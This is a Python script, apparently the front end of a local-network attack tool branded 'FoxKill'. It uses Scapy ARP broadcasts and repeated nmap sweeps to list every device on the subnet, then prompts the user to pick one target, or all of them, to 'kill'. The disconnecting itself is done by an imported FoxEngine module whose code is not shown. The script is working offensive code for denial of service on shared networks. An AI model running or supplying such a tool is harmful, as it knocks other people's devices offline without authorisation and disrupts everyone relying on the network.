import scapy.all as scapy
import os
import sys
import time
import subprocess
import re
from colorama import Fore, Style, init
from engine import FoxEngine

init(autoreset=True)

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""
{Fore.RED}    ███████  ██████  ██   ██ ██   ██ ██ ██       ██      
{Fore.RED}    ██      ██    ██  ██ ██  ██  ██  ██ ██       ██      
{Fore.WHITE}    █████   ██    ██   ███   █████   ██ ██       ██      
{Fore.YELLOW}    ██      ██    ██  ██ ██  ██  ██  ██ ██       ██      
{Fore.YELLOW}    ██       ██████  ██   ██ ██   ██ ██ ███████ ███████ 
{Fore.CYAN}    -------------------------------------------------------
{Fore.WHITE}    >> {Fore.RED}NUCLEAR SCAN MODE: BRUTEFORCE DEVICE DETECTION {Fore.WHITE}<<
{Fore.CYAN}    -------------------------------------------------------
{Fore.GREEN}    Developer : Cyberlatchofficial | Zero Device Escape
    """)

def get_net_info():
    try:
        route = subprocess.check_output("ip route | grep default", shell=True).decode()
        gw = re.search(r'via (\d+\.\d+\.\d+\.\d+)', route).group(1)
        my_ip = subprocess.check_output(f"hostname -I", shell=True).decode().split()[0]
        net_range = ".".join(gw.split(".")[:-1]) + ".0/24"
        return gw, net_range, my_ip
    except:
        sys.exit(f"{Fore.RED}[!] Error: Run with sudo.")

def nuclear_scan(network, my_ip, gw):
    print(f"{Fore.YELLOW}[*] Initializing Nuclear Scan... (Finding every single device)")
    devices = {}
    
    # Pass 1: Scapy ARP
    print(f"{Fore.CYAN}[+] Pass 1: Scapy ARP Broadcast...")
    arp_request = scapy.ARP(pdst=network)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    answered = scapy.srp(broadcast/arp_request, timeout=3, verbose=False)[0]
    
    for res in answered:
        ip = res[1].psrc
        if ip != my_ip and ip != gw:
            devices[ip] = {"mac": res[1].hwsrc, "vendor": "Active Device"}

    # Pass 2: Nmap Bruteforce
    print(f"{Fore.CYAN}[+] Pass 2: Nmap Bruteforce (10x Repetition)...")
    for i in range(1, 11):
        sys.stdout.write(f"\r    - Scanning Round: {i}/10")
        sys.stdout.flush()
        raw_res = subprocess.check_output(f"sudo nmap -sn -PR -T4 {network}", shell=True).decode()
        found_ips = re.findall(r'for (\d+\.\d+\.\d+\.\d+)', raw_res)
        
        for ip in found_ips:
            if ip != my_ip and ip != gw and ip not in devices:
                mac_res = subprocess.check_output(f"ip neighbor show {ip}", shell=True).decode()
                mac = re.search(r'(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', mac_res)
                devices[ip] = {"mac": mac.group(0) if mac else "Unknown", "vendor": "Detected via Bruteforce"}
        time.sleep(0.1)

    print(f"\n\n{Fore.WHITE}{'ID':<4} | {'IP Address':<16} | {'MAC Address':<18} | {'Status'}")
    print(f"{Fore.CYAN}" + "-"*70)
    
    clients_list = [{"ip": "ALL DEVICES", "mac": "FF:FF:FF:FF:FF:FF"}]
    print(f"{Fore.RED}{0:<4} | {Fore.WHITE}{'EVERYONE':<16} | {Fore.YELLOW}{'FF:FF:FF:FF:FF:FF':<18} | {Fore.CYAN}Total Lockdown")

    for i, (ip, data) in enumerate(sorted(devices.items()), 1):
        clients_list.append({"ip": ip, "mac": data['mac']})
        print(f"{Fore.GREEN}{i:<4} | {Fore.WHITE}{ip:<16} | {Fore.YELLOW}{data['mac']:<18} | {Fore.CYAN}Online")
    
    return clients_list

def main():
    clear()
    banner()
    gw, net_range, my_ip = get_net_info()
    print(f"{Fore.CYAN}[INFO] Gateway: {gw} | Your IP: {my_ip}\n")
    
    targets = nuclear_scan(net_range, my_ip, gw)
    
    try:
        choice = int(input(f"\n{Fore.WHITE}Select ID to Kill (0 for ALL): "))
        engine = FoxEngine("", gw) 
        
        if choice == 0:
            all_ips = [t['ip'] for t in targets[1:]] 
            print(f"\n{Fore.RED}[!!!] KILLING ENTIRE NETWORK...")
            engine.kill_all(all_ips)
        else:
            target_ip = targets[choice]['ip']
            engine.target_ip = target_ip
            print(f"\n{Fore.RED}[!!!] TARGET {target_ip} IS NOW OFFLINE.")
            engine.kill_connection()
            
    except (ValueError, IndexError, KeyboardInterrupt):
        print(f"\n{Fore.GREEN}[+] Restoring connections and exiting...")

if __name__ == "__main__":
    main()
